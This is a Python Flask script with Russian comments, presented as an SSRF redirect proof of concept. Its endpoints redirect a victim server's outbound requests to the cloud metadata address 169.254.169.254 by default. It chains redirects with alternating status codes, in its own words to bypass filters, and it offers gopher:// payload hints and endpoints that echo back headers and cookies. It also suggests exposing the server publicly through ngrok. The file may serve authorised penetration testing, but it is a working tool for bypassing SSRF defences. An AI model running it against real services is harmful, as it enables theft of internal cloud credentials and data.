#!/usr/bin/env python3
"""
SSRF Redirect PoC - тестовый сервер для обхода SSRF-защиты через редиректы
Запуск: python3 ssrf_redirect_server.py
"""

from flask import Flask, redirect, request, make_response, jsonify
import logging
import time
from urllib.parse import urlparse

app = Flask(__name__)

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================
# БАЗОВЫЕ ТЕСТЫ
# ============================================

@app.route('/')
def index():
    """Главная страница со списком всех тестов"""
    return '''
    <html>
    <head><title>SSRF Redirect PoC</title></head>
    <body>
        <h1>SSRF Redirect Test Server</h1>
        <p>Доступные эндпоинты:</p>
        <ul>
            <li><a href="/test">/test</a> - базовый тест</li>
            <li><a href="/redirect?target=http://169.254.169.254/latest/meta-data/">/redirect?target=URL</a> - простой редирект</li>
            <li><a href="/chain?count=0">/chain?count=0</a> - цепочка редиректов</li>
            <li><a href="/status/302">/status/302</a> - редирект с разными статусами</li>
            <li><a href="/delay?seconds=2&target=http://169.254.169.254/">/delay</a> - редирект с задержкой</li>
            <li><a href="/headers">/headers</a> - показать заголовки запроса</li>
            <li><a href="/reflect">/reflect</a> - отразить все данные</li>
            <li><a href="/gopher">/gopher</a> - тест gopher протокола</li>
        </ul>
    </body>
    </html>
    '''

@app.route('/test')
def test():
    """Простой тестовый эндпоинт"""
    return jsonify({
        'status': 'ok',
        'message': 'SSRF test server is running',
        'your_ip': request.remote_addr,
        'headers': dict(request.headers),
        'args': dict(request.args)
    })

# ============================================
# РЕДИРЕКТЫ
# ============================================

@app.route('/redirect')
def simple_redirect():
    """Простой 302 редирект на целевой URL"""
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    
    # Логируем запрос
    logger.info(f"Redirect request from: {request.remote_addr}")
    logger.info(f"User-Agent: {request.headers.get('User-Agent')}")
    logger.info(f"Redirecting to: {target}")
    
    # Возвращаем редирект
    response = make_response('', 302)
    response.headers['Location'] = target
    response.headers['X-Debug-Info'] = f'Redirected from {request.url}'
    return response

@app.route('/chain')
def redirect_chain():
    """Цепочка редиректов для обхода защиты"""
    count = int(request.args.get('count', 0))
    max_redirects = 5
    
    if count < max_redirects:
        next_count = count + 1
        next_url = f'/chain?count={next_count}'
        
        # Чередуем статусы для обхода фильтров
        status_codes = [301, 302, 303, 307, 308]
        status = status_codes[count % len(status_codes)]
        
        logger.info(f"Redirect chain step {count+1}/{max_redirects} (status {status})")
        
        response = make_response('', status)
        response.headers['Location'] = next_url
        response.headers['X-Redirect-Count'] = str(count)
        return response
    else:
        # После цепочки - на целевой URL
        target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
        logger.info(f"Final redirect to: {target}")
        
        response = make_response('', 302)
        response.headers['Location'] = target
        return response

@app.route('/status/<int:code>')
def status_redirect(code):
    """Редирект с разными HTTP статусами"""
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    
    # Проверяем, что статус - редирект
    valid_status = [301, 302, 303, 307, 308]
    if code not in valid_status:
        return f"Invalid redirect status. Use: {valid_status}", 400
    
    logger.info(f"Redirect with status {code} to: {target}")
    
    response = make_response('', code)
    response.headers['Location'] = target
    return response

@app.route('/delay')
def delayed_redirect():
    """Редирект с задержкой для тестирования таймаутов"""
    seconds = int(request.args.get('seconds', 2))
    target = request.args.get('target', 'http://169.254.169.254/latest/meta-data/')
    
    logger.info(f"Delaying {seconds}s before redirect to: {target}")
    time.sleep(seconds)
    
    response = make_response(f'Delayed {seconds}s', 302)
    response.headers['Location'] = target
    return response

# ============================================
# ОТОБРАЖЕНИЕ ДАННЫХ
# ============================================

@app.route('/headers')
def show_headers():
    """Показать заголовки, с которыми пришел запрос"""
    headers = dict(request.headers)
    
    logger.info(f"Headers from {request.remote_addr}: {headers}")
    
    return jsonify({
        'method': request.method,
        'url': request.url,
        'headers': headers,
        'args': dict(request.args),
        'cookies': dict(request.cookies),
        'remote_addr': request.remote_addr
    })

@app.route('/reflect', methods=['GET', 'POST'])
def reflect_all():
    """Отразить все данные запроса (полезно для тестов)"""
    result = {
        'method': request.method,
        'url': request.url,
        'headers': dict(request.headers),
        'args': dict(request.args),
        'cookies': dict(request.cookies),
        'remote_addr': request.remote_addr,
        'timestamp': time.time()
    }
    
    # Если POST, добавляем тело
    if request.method == 'POST':
        result['data'] = request.get_data(as_text=True)
        result['form'] = dict(request.form)
        result['json'] = request.get_json(silent=True)
    
    logger.info(f"Reflect request from {request.remote_addr}")
    return jsonify(result)

# ============================================
# ПРОДВИНУТЫЕ ТЕСТЫ
# ============================================

@app.route('/gopher')
def gopher_test():
    """Тест для gopher:// протокола"""
    return '''
    <html>
    <body>
        <h2>Gopher Test</h2>
        <p>Для тестирования gopher:// используйте:</p>
        <code>/?target=gopher://localhost:8080/_TEST%20DATA%0D%0A</code>
        
        <form>
            <input type="text" name="target" size="50" placeholder="gopher://...">
            <input type="submit" value="Test">
        </form>
    </body>
    </html>
    '''

@app.route('/dns')
def dns_test():
    """Тест DNS взаимодействия"""
    import socket
    
    hostname = request.args.get('host', 'example.com')
    try:
        ip = socket.gethostbyname(hostname)
        return jsonify({
            'hostname': hostname,
            'resolved_ip': ip,
            'success': True
        })
    except Exception as e:
        return jsonify({
            'hostname': hostname,
            'error': str(e),
            'success': False
        })

# ============================================
# ЗАПУСК
# ============================================

if __name__ == '__main__':
    print("=" * 50)
    print("SSRF Redirect Test Server")
    print("=" * 50)
    print("Доступные эндпоинты:")
    print("  /                 - главная")
    print("  /redirect         - простой редирект")
    print("  /chain            - цепочка редиректов")
    print("  /status/<code>    - редирект с конкретным статусом")
    print("  /delay            - редирект с задержкой")
    print("  /headers          - показать заголовки")
    print("  /reflect          - отразить все данные")
    print("=" * 50)
    print("Запуск сервера на 0.0.0.0:8080...")
    print("Для публичного доступа используй ngrok: ngrok http 8080")
    print("=" * 50)
    
    app.run(host='0.0.0.0', port=8080, debug=True)